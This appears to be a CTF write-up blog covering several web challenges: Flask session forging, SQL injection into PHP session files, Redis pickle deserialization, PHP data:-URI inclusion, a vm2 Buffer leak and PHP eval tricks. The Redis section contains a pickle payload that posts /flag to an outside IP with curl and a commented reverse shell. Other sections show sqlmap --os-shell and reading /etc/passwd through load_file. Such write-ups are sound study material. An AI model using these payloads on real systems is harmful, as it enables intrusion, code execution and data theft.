<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8 </span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request </span><br><span class="line">app = Flask(__name__) </span><br><span class="line">random.seed(uuid.getnode()) </span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>) </span><br><span class="line">app.debug = <span class="literal">True</span> @app.route(<span class="string">'/'</span>) </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! Read somethings'</span> </span><br><span class="line"><span class="meta">@app.route('/read') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>) </span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE) </span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE) </span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span> </span><br><span class="line">        res = urllib.urlopen(url) </span><br><span class="line">        <span class="keyword">return</span> res.read() </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex: </span><br><span class="line">        <span class="keyword">print</span> str(ex) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'no response'</span> </span><br><span class="line"><span class="meta">@app.route('/flag') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>: </span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>: </span><br><span class="line">    app.run( debug=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span> )</span><br></pre></td></tr></table></figure>
<p>查看网卡mac地址/sys/class/net/eth0/address, 这是随机数种子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">02:42:ae:00:25:dc</span><br></pre></td></tr></table></figure>
<p>然后生成sessioncookie后带着去访问/flag路由</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> session_cookie_manager</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:00:25:dc"</span></span><br><span class="line">random.seed(int(mac.replace(<span class="string">":"</span>, <span class="string">""</span>), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    SECRET_KEY = str(random.random() * <span class="number">233</span>)</span><br><span class="line">    rs = session_cookie_manager.FSCM.decode(<span class="string">'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XSvUPA.wZLQx0OtNIiEv8Q9j2ueW2FJ6-w'</span>, SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> <span class="keyword">not</span> <span class="keyword">in</span> rs:</span><br><span class="line">        print(SECRET_KEY)</span><br><span class="line">        rs[<span class="string">u'username'</span>] = <span class="string">'fuck'</span></span><br><span class="line">        print(str(rs))</span><br><span class="line">        print(session_cookie_manager.FSCM.encode(SECRET_KEY, str(rs)))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="360ctf-立誓要成为admin的男人">360ctf 立誓要成为admin的男人</h2>
<p>开局提示不是admin</p>
<p>盲注</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67405937-fea53080-f5e7-11e9-8d22-aeddaf0e3cec.png" alt="image"></p>
<p>然后使用sqlmap来反弹mysql shell, 命令 <code>mysql -u xxxx -r&quot;xxxxx&quot; -p username --os-shell</code></p>
<p>然后发现了user表格, admin 的md5 爆破不出来. 可以读取/etc/passwd, 命令 <code>select load_file('/etc/passwd');</code></p>
<p>再尝试读取/var/www/html/index.php, 失败,向站点写文件失败,访问404, 命令<code> username=1' union select 'test' into outfile '/var/www/html/1.php</code>.</p>
<p>扫描网站发现test.php, 访问结果如下, 如果登录过就会打印当前用户名, <code>可以猜测为session</code>.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/67407018-72940880-f5e9-11e9-916f-92587e78c5e8.png" alt="image"></p>
<p>向/tmp/sess_xxxxxxxxxxx写入admin的序列化字符串, 并用xxxxxxx作为PHPSESSID访问index.php就可以得到flag.</p>
<p>命令:<code>username=1' union select 'username|s:5:&quot;admin&quot;;' into outfile '/tmp/sess_xxxxxxxxxxxxxxxx</code></p>
<h2 id="swpuctf-2019-web2">swpuctf 2019 web2</h2>
<p>这是一道flask 和redis 组合的题目, 用户访问flask页面之后的session会以序列化的形式存储在redis中, 在携带对应session访问页面的时候就会将redis中对应session的值拿出来进行反序列化操作, 题目提示redis弱口令, 猜出来弱口令是password , 远程连接redis命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 114.67.109.247 -a password</span><br></pre></td></tr></table></figure>
<p>常用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keys abb* 查看以abb开头的键名</span><br><span class="line">get xxxxxxxxxx 查看键名所对应的值</span><br></pre></td></tr></table></figure>
<p>我们进入redis之后先从浏览器查看自己的session然后修改在redis中的值, 这里要注意, 浏览器中的session值比如是<code>13f6bcbd-79f9-4244-9ac9-0cbd8ba51c43.b-AAbkvcTO8kkzyFfsVTBiRgPDc</code>, 那么在redis中存储的键是13f6bcbd-79f9-4244-9ac9-0cbd8ba51c43也就是点号前面的部分而不是全部, 这一点是当时观察redis中的键名发现的, 但是为什么会这样也还没有弄懂, 最后参考了(p牛的博客)[<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a>]和脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl -d "@/flag" 39.105.176.37:12334"""</span></span><br><span class="line">        <span class="comment">#  s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("39.105.176.37",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line">r = redis.Redis(host=<span class="string">'114.67.109.247'</span>, port=<span class="number">6379</span>, password=<span class="string">'password'</span>)</span><br><span class="line"></span><br><span class="line">r.set(<span class="string">"session:58b89cd8-a994-4436-99d3-a6612ba42774"</span>, s)</span><br></pre></td></tr></table></figure>
<p>服务器开启监听, 然后刷新浏览器就可以收到flag了</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70392153-a7ccac80-1a17-11ea-84d3-4c968f19a38a.png" alt="image"></p>
<h2 id="swpuctf-2019-web3">swpuctf 2019 web3</h2>
<p>python flask 页面, 输入错误路由 比如http://xx.xx.xx.xx/hahaha 查看响应头中泄露secretkey, 然后通过这个来生成, 拿到正常的session解出来之后是这么个玩意,解析出来有点问题</p>
<p><img src="C:%5CUsers%5Cch4ser__%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20191209001920817.png" alt="image-20191209001920817"></p>
<p>而且flask_session_cookie_manager.py生成的session是不行的, 用以下脚本生成可以</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  the session cookie is diffent between python2 and python3</span></span><br><span class="line"><span class="comment">#  can also generate session cookie by  flask-unsign --secret 'fb+wwn!n1yo                                                                                                                  +9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y' --sign --cookie "admin"                                                                                                                          from flask import Flask</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'keyqqqwwweee!@#$%^&amp;*'</span></span><br><span class="line"></span><br><span class="line">sessions_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = &#123;<span class="string">u'username'</span>: <span class="string">u'admin'</span>, <span class="string">u'password'</span>: <span class="string">u'admin'</span>, <span class="string">u'id'</span>: <span class="string">'1'</span>, <span class="string">u'is_login'</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    print(sessions_serializer.dumps(target))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>生成session</p>
<p>带着这个session访问, 有文件上传功能, 在本地生成软连接之后压缩成zip数据包并上传, 可以在回显中读到链接所指向的文件 , 查看前端代码可以发现flag的路径, 根据这个上传zip即可</p>
<p><img src="https://user-images.githubusercontent.com/40637063/70392342-21fe3080-1a1a-11ea-9f03-1e22d8bed64d.png" alt="image"></p>
<h2 id="Insomni’hack-2019-Phuck2">Insomni’hack 2019 Phuck2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);<span class="comment">// 注释掉了php协议,不能用php://之类的玩意了</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这个函数将敏感字符给转义了,没法利用</span></span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    <span class="comment">// 根据X-Forwarded-For 来创建新的文件目录</span></span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    </span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line"><span class="comment">// 将server中所有内容都放进profile文件中,那么是否可以把php代码给放在$_SERVER中?</span></span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line"><span class="comment">//切回上一个目录</span></span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line"><span class="comment">// 获取page变量的内容并替换点号</span></span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line"><span class="comment">// page所指向文件的内容中不能有<span class="meta">&lt;?</span>和php字符</span></span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="comment">// 满足条件就包含page</span></span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 回到主目录并删除之前创建的文件</span></span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.php?page=data:,123456/profile HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9767</span><br><span class="line">XXX: &lt;?php system(&apos;ls data:,123456&apos;);?&gt;</span><br><span class="line">X-Forwarded-For: data:,123456</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line">Cookie: csrftoken=eIQq1N7Rt009rYp1nhaMba1lvw9TZSNcJ6BoSp5KnIjOMSj4kQQ8nu8xQbrGr3IZ; sessionid=rreroe8p3tjqcelwzw1mfhe8dlbhmh8h</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br></pre></td></tr></table></figure>
<p>关键在于<code>page=data:,123456/profile</code> 这里,对于<code>file_get_content</code>函数,可以利用data协议格式如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;media type&gt;][;base64],&lt;data&gt;</span><br></pre></td></tr></table></figure>
<p>前面两个都是可选项,平时网页里头有的直接用base64方式传入图片的就是这种协议.</p>
<p><code>file_get_content('data:,123456/profile')</code> 返回值就是<code>123456/profile</code> 就可以绕过条件判断的限制了.</p>
<p>接下来是include…看别人wp说<code>allow_url_include=Off </code> 不知道怎么看出来的,但是又说<code>data:,&lt;目录&gt;</code>这种格式又可以绕过并成功包含,不知道是为什么.</p>
<p>总之到这里是包含了<code>data:,123456/profile</code>这个文件了.接下来执行代码就可以了.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61700767-a6a02900-ad6f-11e9-9f29-2aa502fabb62.png" alt="image"></p>
<h2 id="hitcon2016-Leaking">hitcon2016 Leaking</h2>
<p>nodejs代码审计</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">"randomstring"</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">"vm2"</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">"./config.js"</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var flag_"</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">" = \"flag&#123;"</span> + flag + <span class="string">"&#125;\";"</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            timeout: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">"eval -&gt;"</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"listening on port 3000!"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>可以看到,flag被赋值给一个随机变量,随后检测我们传入的参数,如果参数的长度小于12就先创建一个虚拟机然后在虚拟机中执行,执行时间不得超过一秒,并且将结果回显到客户端,否则依然显示当前执行文件的内容(也就是当前文件).</p>
<p>正常来说,虚拟机是不能访问虚拟机外的文件和变量的,但是可以如果是内存呢?</p>
<p><a href="https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md" target="_blank" rel="noopener">https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md</a></p>
<p>照着他的demo来实验一下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="string">'password'</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> step=<span class="number">0</span>; step&lt;<span class="number">100000</span>; step++)&#123;</span><br><span class="line">    <span class="keyword">var</span> buf = (<span class="keyword">new</span> Buffer(<span class="number">200</span>)).toString(<span class="string">'ascii'</span>);</span><br><span class="line">    <span class="keyword">if</span>(buf.indexOf(token) !== <span class="number">-1</span>)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">'found at step'</span> + step +<span class="string">':'</span> +buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试结果:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61681294-8d7f8400-ad3f-11e9-9025-c5381c2d101f.png" alt="image"></p>
<p>注意这个漏洞只在5.4.1这种较低版本中会出现,因此执行的时候也要使用nvm来控制版本执行.</p>
<p>回到题目,看orange 的wp的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true; do curl &apos;http://1.2.3.4/?data=Buffer(1e4)&apos; | grep -a flag; done;</span><br></pre></td></tr></table></figure>
<p>执行(直接复制到命令行会自动转义,要把转义符号去掉)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61681531-58bffc80-ad40-11e9-9d6d-cb8a7cfb2885.png" alt="image"></p>
<p>看到另外一篇wphttps://lorexxar.cn/2016/10/10/hitcon2016/#leaking,发现数组是可以绕过长度限制的,但是他的payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://52.198.115.130:3000/?data[]=for (var step = 0; step &lt; 100000; step++) &#123;var buf = (new Buffer(100)).toString(&apos;ascii&apos;);if (buf.indexOf(&quot;hitcon&#123;&quot;) !== -1) &#123;break;&#125;&#125;buf;</span><br></pre></td></tr></table></figure>
<p>会超时,大概是因为不在现场吧.</p>
<h2 id="buuoj-unicorn-shop">buuoj unicorn shop</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61510616-34a1aa00-aa26-11e9-91d3-e63e73d2cb62.png" alt="image"></p>
<p>这里只有两个地方可以输入,我们要买的东西就是第四个玩意,但是随便输入一些东西就会发现,价格那一栏只能填一个字符.查看源码看看.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61510696-95c97d80-aa26-11e9-8abb-dbdaf20048b2.png" alt="image"></p>
<p>他说这个utf-8编码很重要…emmm…查了一下发现有原题.可以传入一个<code>ↈ</code> 符号,这个是某个国家的计量符号,代表十万,不过也可以传入<code>亿</code> 这样中文的字符来表示我们的价格.这样就能得到flag了.</p>
<h2 id="ichunqiu-爆破-2">ichunqiu 爆破-2</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p><code>hello=$GLOBALS</code> works , but flag is not a variable in this case .</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello=file_get_contents(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure>
<p>it work! <code>file_get_contents</code> function will return a variable whose type is <code>string</code>.</p>
<h2 id="ichunqiu-爆破-1">ichunqiu 爆破-1</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string(<span class="number">38</span>) <span class="string">"flag在一个长度为6的变量里面"</span> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>This puzzle was so easy to mislead us to write a script and trying to enumerate all possibilities… But actually , when observing the <code>var_dump($$a);</code> we can surely use <code>$GLOBAL</code> to print all variables.</p>
<p>SO, just let <code>hello=GLOBALS</code> and we can get flag.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59854352-59fab400-93a5-11e9-8086-653e956e7013.png" alt="image"></p>
<blockquote>
<p>ps: Global variables in php</p>
<p>$GLOBALS</p>
<p>$_SERVER</p>
<p>$_REQUEST</p>
<p>$_POST</p>
<p>$_GET</p>
<p>$_FILES</p>
<p>$_ENV</p>
<p>$_COOKIE</p>
<p>$_SESSION</p>
</blockquote>
<h2 id="ichunqiu-象棋">ichunqiu 象棋</h2>
<p>Find flag by brute-force, finding two scripts from others to learn.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://c8f52486449f4f9fadd09977d3349ea281ba15d9079e48b8.changame.ichunqiu.com/js/'</span></span><br><span class="line">    strs = <span class="string">'abcmlyx'</span></span><br><span class="line">    num = <span class="string">'0123456789'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            <span class="keyword">for</span> h <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> num:</span><br><span class="line">                       new_url = url+i+j+<span class="string">'ctf'</span>+h+l+n+<span class="string">'.js'</span></span><br><span class="line">                       q.put(new_url)</span><br><span class="line">                       </span><br><span class="line">                       </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">requ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        u = q.get(<span class="literal">True</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(u).text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">                print(r)</span><br><span class="line">            q.task_done()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            q.put(u)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    text()</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> range(<span class="number">300</span>):</span><br><span class="line">        t = threading.Thread(target=requ)</span><br><span class="line">        t.daemon = <span class="literal">True</span></span><br><span class="line">        t.start()</span><br><span class="line">        </span><br><span class="line">    q.join()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># Author=haya</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line">urllist = []</span><br><span class="line">re1 = <span class="string">'myx'</span></span><br><span class="line">re2 = <span class="string">'012346789'</span></span><br><span class="line">url = <span class="string">'http://d0fdd193e2fa40ab9287e6c40341ef4fc310ea9b723f4b84.game.ichunqiu.com/js/'</span></span><br><span class="line">pool = ThreadPool()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_list</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> re1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> re1:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> re2:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> re2:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> re2:</span><br><span class="line">               			urllist.append(url+i+j+<span class="string">'ctf'</span>+k+l+m+<span class="string">'.js'</span>)</span><br><span class="line">    <span class="keyword">return</span> urllist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">url_open</span><span class="params">(url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = urllib2.urlopen(url).read()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">print</span> url+result</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    urllist = url_list()</span><br><span class="line">    pool.map(url_open, urllist)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="ichunqiu-时间">ichunqiu 时间</h2>
<p>Source Code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="string">'天下武功唯快不破'</span>;</span><br><span class="line">setcookie(<span class="string">'token'</span>,<span class="string">'hello'</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> ($_COOKIE[<span class="string">'token'</span>]==<span class="string">'hello'</span>)&#123;</span><br><span class="line">  $txt = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">  $filename = <span class="string">'u/'</span>.md5(mt_rand(<span class="number">1</span>,<span class="number">1000</span>)).<span class="string">'.txt'</span>;</span><br><span class="line">  file_put_contents($filename,$txt);</span><br><span class="line">  sleep(<span class="number">10</span>);</span><br><span class="line">  unlink($filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The script to generate filename:</p>
